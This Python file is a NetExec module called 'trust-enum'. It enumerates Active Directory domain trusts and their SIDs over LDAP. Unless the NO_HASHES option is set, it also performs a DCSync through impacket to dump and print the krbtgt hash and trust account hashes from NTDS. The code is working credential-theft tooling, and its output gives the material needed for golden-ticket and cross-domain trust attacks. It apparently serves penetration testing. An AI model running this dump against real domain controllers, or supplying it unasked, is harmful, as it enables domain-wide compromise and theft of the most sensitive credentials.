from contextlib import suppress
from impacket.smbconnection import SMBConnection
from impacket.examples.secretsdump import RemoteOperations, NTDSHashes
from impacket.dcerpc.v5.drsuapi import DCERPCSessionError
from nxc.parsers.ldap_results import parse_result_attributes
from nxc.helpers.misc import CATEGORY


class NXCModule:
    """
    Comprehensive Domain Trust Enumeration Module
    
    This module performs the following operations:
    1. Enumerates all trust relationships (parent/child domains)
    2. Displays domain SIDs for all trusted domains
    3. Extracts krbtgt account hash from NTDS
    4. Extracts trust account hashes from NTDS
    
    Module created for comprehensive domain trust analysis
    """

    name = "trust-enum"
    description = "Enumerate domain trusts, SIDs, krbtgt and trust account hashes"
    supported_protocols = ["ldap"]
    category = CATEGORY.ENUMERATION

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
        self.current_domain_sid = None
        self.current_domain_name = None
        self.trust_data = []
        self.krbtgt_hash = None
        self.trust_hashes = []

    def options(self, context, module_options):
        """
        NO_HASHES    Skip extracting krbtgt and trust hashes from NTDS (only enumerate trusts and SIDs)
        
        Examples:
        netexec ldap <ip> -u <username> -p <password> -M trust-enum
        netexec ldap <ip> -u <username> -p <password> -M trust-enum -o NO_HASHES=True
        """
        self.context = context
        self.module_options = module_options
        self.skip_hashes = module_options.get("NO_HASHES", False)

    def on_admin_login(self, context, connection):
        """Execute the trust enumeration on successful admin login"""
        self.context = context
        
        context.log.display("=" * 70)
        context.log.display("DOMAIN TRUST ENUMERATION MODULE")
        context.log.display("=" * 70)
        
        # Step 1: Get current domain information
        self._get_current_domain_info(connection)
        
        # Step 2: Enumerate trust relationships
        self._enumerate_trusts(connection)
        
        # Step 3: Display trust summary
        self._display_trust_summary()
        
        # Step 4: Extract hashes if requested
        if not self.skip_hashes:
            context.log.display("")
            context.log.display("=" * 70)
            context.log.display("EXTRACTING SENSITIVE HASHES FROM NTDS")
            context.log.display("=" * 70)
            self._extract_hashes(connection)
            self._display_hash_summary()
        
        context.log.display("")
        context.log.display("=" * 70)
        context.log.display("TRUST ENUMERATION COMPLETE")
        context.log.display("=" * 70)

    def _get_current_domain_info(self, connection):
        """Get current domain name and SID"""
        self.current_domain_name = connection.domain
        self.current_domain_sid = connection.sid_domain
        
        self.context.log.display("")
        self.context.log.highlight("[*] CURRENT DOMAIN INFORMATION:")
        self.context.log.success(f"    Domain Name: {self.current_domain_name}")
        if self.current_domain_sid:
            self.context.log.success(f"    Domain SID:  {self.current_domain_sid}")
            self.context.log.highlight(f"    {self.current_domain_name}:{self.current_domain_sid}")
        else:
            self.context.log.fail("    Could not retrieve current domain SID")

    def _enumerate_trusts(self, connection):
        """Enumerate all trust relationships"""
        self.context.log.display("")
        self.context.log.highlight("[*] ENUMERATING TRUST RELATIONSHIPS:")
        
        base_dn = f"CN=System,{connection.baseDN}"
        attributes = ["name", "trustPartner", "securityIdentifier", "trustDirection", 
                     "trustType", "trustAttributes", "flatName"]
        
        try:
            response = connection.search(
                searchFilter="(objectClass=trustedDomain)",
                attributes=attributes,
                baseDN=base_dn,
            )
            trusts = parse_result_attributes(response)
            
            if not trusts:
                self.context.log.display("    No trust relationships found")
                return
            
            self.context.log.success(f"    Found {len(trusts)} trust relationship(s)")
            self.context.log.display("")
            
            for idx, trust in enumerate(trusts, 1):
                trust_info = self._parse_trust_data(trust)
                self.trust_data.append(trust_info)
                self._display_trust_details(idx, trust_info)
                
        except Exception as e:
            self.context.log.fail(f"Failed to enumerate trusts: {e}")

    def _parse_trust_data(self, trust):
        """Parse trust data from LDAP response"""
        trust_name = trust.get("name", "Unknown")
        trust_partner = trust.get("trustPartner", trust_name)
        trust_flat_name = trust.get("flatName", "")
        trust_direction = int(trust.get("trustDirection", 0))
        trust_type = int(trust.get("trustType", 0))
        trust_attributes = int(trust.get("trustAttributes", 0))
        
        # Convert SID from binary to string format
        trust_sid = None
        raw_sid = trust.get("securityIdentifier")
        if raw_sid:
            try:
                revision = raw_sid[0]
                count = raw_sid[1]
                id_auth = int.from_bytes(raw_sid[2:8], byteorder="big")
                sub_auths = [
                    str(int.from_bytes(raw_sid[8 + i * 4 : 12 + i * 4], byteorder="little"))
                    for i in range(count)
                ]
                trust_sid = f"S-{revision}-{id_auth}-" + "-".join(sub_auths)
            except Exception as e:
                self.context.log.debug(f"Failed to convert trust SID: {e}")
        
        # Determine trust relationship type (parent/child/external)
        relationship_type = "Unknown"
        if trust_type == 2:  # Active Directory trust
            if trust_attributes & 0x20:  # Within Forest
                # Check if parent or child
                if trust_sid and self.current_domain_sid:
                    # Parent domain has fewer RID components
                    current_parts = self.current_domain_sid.split("-")
                    trust_parts = trust_sid.split("-")
                    if len(trust_parts) < len(current_parts):
                        relationship_type = "Parent Domain"
                    elif len(trust_parts) > len(current_parts):
                        relationship_type = "Child Domain"
                    else:
                        relationship_type = "Same Level Domain"
            else:
                relationship_type = "External Domain"
        
        return {
            "name": trust_partner,
            "flat_name": trust_flat_name,
            "sid": trust_sid,
            "direction": trust_direction,
            "type": trust_type,
            "attributes": trust_attributes,
            "relationship": relationship_type,
        }

    def _display_trust_details(self, idx, trust_info):
        """Display detailed trust information"""
        # Trust direction mapping
        direction_map = {
            0: "Disabled",
            1: "Inbound (This domain trusts the trusted domain)",
            2: "Outbound (The trusted domain trusts this domain)",
            3: "Bidirectional (Two-way trust)",
        }
        
        # Trust type mapping
        type_map = {
            1: "Windows NT (Downlevel)",
            2: "Active Directory (Uplevel)",
            3: "Kerberos (MIT)",
            4: "DCE",
            5: "Azure Active Directory",
        }
        
        # Trust attributes flags
        attribute_flags = {
            0x1: "Non-Transitive",
            0x2: "Uplevel-Only",
            0x4: "Quarantined Domain",
            0x8: "Forest Transitive",
            0x10: "Cross Organization",
            0x20: "Within Forest",
            0x40: "Treat as External",
            0x80: "Uses RC4 Encryption",
            0x200: "Cross Organization No TGT Delegation",
            0x800: "Cross Organization Enable TGT Delegation",
            0x2000: "PAM Trust",
        }
        
        self.context.log.highlight(f"    ┌─ TRUST {idx} ─────────────────────────────────────")
        self.context.log.success(f"    │ Domain Name:      {trust_info['name']}")
        if trust_info['flat_name']:
            self.context.log.success(f"    │ NetBIOS Name:     {trust_info['flat_name']}")
        
        # Display Domain:SID format prominently
        if trust_info['sid']:
            self.context.log.success(f"    │ Domain SID:       {trust_info['sid']}")
            self.context.log.highlight(f"    │ >>> {trust_info['name']}:{trust_info['sid']}")
        else:
            self.context.log.fail(f"    │ Domain SID:       Not available")
        
        self.context.log.success(f"    │ Relationship:     {trust_info['relationship']}")
        self.context.log.success(f"    │ Direction:        {direction_map.get(trust_info['direction'], 'Unknown')}")
        self.context.log.success(f"    │ Type:             {type_map.get(trust_info['type'], 'Unknown')}")
        
        # Display trust attributes
        attributes_list = [
            text for flag, text in attribute_flags.items()
            if trust_info['attributes'] & flag
        ]
        if attributes_list:
            self.context.log.success(f"    │ Attributes:       {', '.join(attributes_list)}")
        else:
            self.context.log.success(f"    │ Attributes:       None or Unknown")
        
        self.context.log.highlight(f"    └────────────────────────────────────────────────────")
        self.context.log.display("")

    def _display_trust_summary(self):
        """Display a summary of all trust relationships"""
        if not self.trust_data:
            return
        
        self.context.log.display("")
        self.context.log.highlight("[*] TRUST RELATIONSHIP SUMMARY:")
        self.context.log.display("")
        
        # Display a visual representation of trust relationships
        self.context.log.highlight(f"    Current Domain: {self.current_domain_name}")
        self.context.log.display("")
        
        for trust in self.trust_data:
            direction_symbol = {
                1: "<--",  # Inbound
                2: "-->",  # Outbound
                3: "<->",  # Bidirectional
                0: "---",  # Disabled
            }.get(trust['direction'], "???")
            
            self.context.log.success(f"    {self.current_domain_name} {direction_symbol} {trust['name']} ({trust['relationship']})")
        
        self.context.log.display("")
        self.context.log.highlight("[*] DOMAIN:SID MAPPINGS:")
        self.context.log.display("")
        self.context.log.highlight(f"    {self.current_domain_name}:{self.current_domain_sid}")
        for trust in self.trust_data:
            if trust['sid']:
                self.context.log.highlight(f"    {trust['name']}:{trust['sid']}")

    def _extract_hashes(self, connection):
        """Extract krbtgt and trust account hashes from NTDS"""
        try:
            # Create SMB connection for DCSync
            smb_conn = self._get_smb_session(connection)
            self._dcsync_special_accounts(smb_conn, connection)
        except Exception as e:
            self.context.log.fail(f"Error during hash extraction: {e}")

    def _get_smb_session(self, ldap_conn):
        """Create SMB session from LDAP connection"""
        smb = SMBConnection(
            remoteName=ldap_conn.hostname,
            remoteHost=ldap_conn.host,
            sess_port=445,
        )

        if ldap_conn.kerberos:
            smb.kerberosLogin(
                user=ldap_conn.username,
                password=ldap_conn.password,
                domain=ldap_conn.domain,
                lmhash=ldap_conn.lmhash,
                nthash=ldap_conn.nthash,
                aesKey=ldap_conn.aesKey,
                kdcHost=ldap_conn.kdcHost,
                useCache=ldap_conn.use_kcache,
            )
        elif ldap_conn.nthash or ldap_conn.lmhash:
            smb.login(ldap_conn.username, "", ldap_conn.domain, 
                     lmhash=ldap_conn.lmhash, nthash=ldap_conn.nthash)
        else:
            smb.login(ldap_conn.username, ldap_conn.password, ldap_conn.domain)
        
        return smb

    def _dcsync_special_accounts(self, smb_conn, ldap_conn):
        """Extract krbtgt and trust account hashes via DCSync"""
        try:
            rop = RemoteOperations(
                smb_conn,
                doKerberos=ldap_conn.kerberos,
                kdcHost=ldap_conn.kdcHost,
            )
            rop.enableRegistry()
            rop.getDrsr()
            boot_key = rop.getBootKey()

            self.context.log.display("    Starting DCSync to extract sensitive hashes...")
            
            # Callback to capture hashes
            def grab_hash(secret_type, secret):
                secret_lower = secret.lower()
                
                # Capture krbtgt hash
                if "krbtgt:" in secret_lower:
                    self.krbtgt_hash = secret
                    self.context.log.highlight(f"    [KRBTGT] {secret}")
                
                # Capture trust account hashes (accounts ending with $)
                # Trust accounts typically have format: DOMAIN$DOMAIN$
                elif "$:" in secret and secret.count("$") >= 1:
                    # Check if it's a trust account (usually contains domain name)
                    if any(trust['flat_name'].lower() in secret_lower or 
                          trust['name'].lower().split('.')[0] in secret_lower 
                          for trust in self.trust_data if trust['flat_name'] or trust['name']):
                        self.trust_hashes.append(secret)
                        self.context.log.highlight(f"    [TRUST] {secret}")

            ntds = NTDSHashes(
                None,
                boot_key,
                isRemote=True,
                noLMHash=True,
                remoteOps=rop,
                justNTLM=True,
                printUserStatus=False,
                perSecretCallback=grab_hash,
            )
            ntds.dump()

        except DCERPCSessionError as e:
            self.context.log.fail(f"    RPC DRSUAPI error: {e}")
        except Exception as e:
            self.context.log.fail(f"    DCSync error: {e}")
        finally:
            with suppress(Exception):
                if 'ntds' in locals():
                    ntds.finish()
            with suppress(Exception):
                if 'rop' in locals():
                    rop.finish()
            with suppress(Exception):
                smb_conn.logoff()

    def _display_hash_summary(self):
        """Display summary of extracted hashes"""
        self.context.log.display("")
        self.context.log.highlight("[*] HASH EXTRACTION SUMMARY:")
        self.context.log.display("")
        
        if self.krbtgt_hash:
            self.context.log.success("    ✓ krbtgt hash extracted successfully")
            self.context.log.highlight(f"    krbtgt: {self.krbtgt_hash}")
        else:
            self.context.log.fail("    ✗ krbtgt hash not found")
        
        self.context.log.display("")
        
        if self.trust_hashes:
            self.context.log.success(f"    ✓ {len(self.trust_hashes)} trust account hash(es) extracted:")
            for trust_hash in self.trust_hashes:
                self.context.log.highlight(f"    {trust_hash}")
        else:
            self.context.log.fail("    ✗ No trust account hashes found")
